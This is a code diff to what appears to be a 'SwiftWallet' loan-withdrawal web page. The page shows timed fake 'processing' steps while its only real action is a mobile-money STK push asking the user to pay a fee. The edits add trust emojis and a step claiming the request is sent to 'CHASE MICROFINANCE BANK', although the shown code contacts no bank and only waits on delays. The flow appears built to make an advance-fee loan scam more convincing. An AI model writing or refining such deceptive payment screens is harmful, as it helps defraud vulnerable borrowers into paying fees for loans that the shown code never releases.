@@ -920,7 +920,7 @@
             
             <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
             <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital ventures STK Push...</p>
-            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL VENTURES</p>
+            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">🔰Please check your phone  for the payment request from ✔️SWIFTWALLET DIGITAL VENTURES✔️</p>
             
             <!-- Trust indicators -->
             <div class="flex justify-center items-center space-x-6 mb-6">
@@ -1518,10 +1518,10 @@
                 localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));
 
                 // Update processing steps
-                updateProcessingStep(1, 'Validating details...');
+                updateProcessingStep(1, 'Validating your details...');
                 await delay(1500);
                 
-                updateProcessingStep(2, 'Sending withdrawal request to release funds..');
+                updateProcessingStep(2, 'Sending withdrawal request to CHASE MICROFINANCE BANK...');
                 await delay(1000);
 
                 // Send STK push for fee payment
@@ -1544,7 +1544,7 @@
                 const result = await response.json();
                 console.log('Fee payment response:', result);
 
-                updateProcessingStep(3, 'Confirming payment...');
+                updateProcessingStep(3, 'Confirming your fee  payment...');
                 await delay(1500);
 
                 hideProcessingOverlay();
